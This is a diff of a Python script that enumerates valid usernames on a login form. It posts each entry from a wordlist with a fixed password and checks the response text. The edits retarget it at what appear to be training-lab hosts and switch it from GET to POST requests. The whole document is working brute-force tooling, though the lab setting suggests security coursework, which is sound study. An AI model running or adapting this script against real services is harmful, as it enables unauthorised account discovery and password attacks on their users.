@@ -3,7 +3,7 @@ import requests
 import os.path
 
 # define target url, change as needed
-url = "http://94.237.48.48:38186/question1/"
+url = "http://94.237.56.76:53697/question2/"
 
 # define a fake headers to present ourself as Chromium browser, change if needed
 #headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}
@@ -14,8 +14,8 @@ headers = {
 
 # define the string expected if valid account has been found. our basic PHP example replies with Welcome in case of success
 
-valid = "Access granted"
-invalid = "Invalid username"
+valid = ''
+invalid = "wronguser"
 
 """
 wordlist is expected as CSV with field like: Vendor,User,Password,Comment
@@ -69,23 +69,26 @@ def main():
                     continue
                 # take username
                 username = fline.strip("\n")
+                print(username)
 
                 # prepare GET data
-                url = "http://83.136.252.24:37919/question1/?Username={}&Password=123".format(username)
+                # url = "http://83.136.252.24:37919/question1/?Username={}&Password=123".format(username)
                 #print(url)
 
                 # do GET request
-                res = requests.get(url, headers=headers)
+                # res = requests.get(url, headers=headers)
 
-                # prepare POST data
-                # data = {
-                #     "userid": username,
-                #     "passwd": password,
-                #     "submit":"submit"
-                # }
+                # prepare POST data23
+                
+                data = {
+                    "Username": username,
+                    "wronguser": "",
+                    "count": "1",
+                    "Password": "123",
+                }
 
                 # do POST request
-                # res = requests.post(url, data=data)
+                res = requests.post(url, data=data)
 
                 # Check for needle in haystack
                 if (check(res.text, invalid)):
